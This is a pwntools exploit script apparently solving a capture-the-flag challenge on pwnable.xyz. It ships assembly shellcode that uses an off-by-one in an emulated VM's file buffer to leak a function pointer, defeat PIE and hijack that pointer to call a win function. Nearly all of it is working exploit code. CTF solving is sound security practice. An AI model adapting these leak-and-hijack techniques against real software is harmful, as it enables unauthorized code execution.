###libunicorn to create x64 vm
###Only open/read/write syscall allowed in vm
###Open syscall allocates a file structure, but does not open any file at all
###Stdin/stdout read/write performs normally
###Other files are hooked with special read/write functions that does not perform any read/write
###Instead, only some copy between file buffer and vm stack are done
###Off by one allows extending file buf size and thus allows copying read_fptr onto stack, which leads to PIE leak and fptr hijack

from pwn import *

context.arch='amd64'

###Structure
'''
File(0x240)
     |    4    |    4    |    4    |    4    |
0x000|    fd   |             path            |
0x010|                  path                 |
0x020|        path       |      contents     |
0x030|                contents               |
                       ...
0x220|      contents     |        size       |
0x230|     read_fptr     |     write_fptr    |
'''

###Addr
file_read_offset = 0x172b
win_offset = 0x1610

###Exploit
shellcode = asm('''
		/*off by one to extend fd2 buffer size*/
                mov rbp, rsp
                sub rsp, 0x300
                mov rdx, 0xffffffffffffffff
                mov rcx, 0x41
                PUSH_L:
                    push rdx
                    dec rcx
                    test rcx,rcx
                    jnz PUSH_L
                mov rax,1
                mov rdi,2
                mov rsi,rsp
                mov rdx,0x201
                syscall

		/*copy fptr onto stack*/
                mov rax,0
                mov rdi,2
                mov rsi,rsp
                mov rdx,0x210
                syscall

		/*write fptr to stdout*/
                mov rax,1
                mov rdi,1
                mov rsi,rsp
                add rsi,0x208
                mov rdx,0x8
                syscall

		/*read win func onto stack*/
                mov rax,0
                mov rdi,0
                mov rsi,rsp
                add rsi,0x208
                mov rdx,0x8
                syscall

		/*hijack fd2 read_ptr*/
                mov rax,1
                mov rdi,2
                mov rsi,rsp
                mov rdx,0x210
                syscall

		/*call fd2 read to trigger win*/
                mov rax,0
                mov rdi,2
                syscall
                hlt
                ''')

r = remote('svc.pwnable.xyz',30044)
r.sendlineafter('(y/n)\n','n')
r.sendlineafter('program\n',shellcode.ljust(0xfff,b'\x00'))
r.recvline()

file_read_addr = u64(r.recv(8))
code_base = file_read_addr-file_read_offset
print(hex(code_base))

r.send(p64(code_base+win_offset))

r.interactive()

###Reference
###Though not needed for this challenge, here are some reference regarding libunicorn
#  unofficial manual
#    https://hackmd.io/@K-atc/rJTUtGwuW?type=view
#  source code
#    https://github.com/unicorn-engine
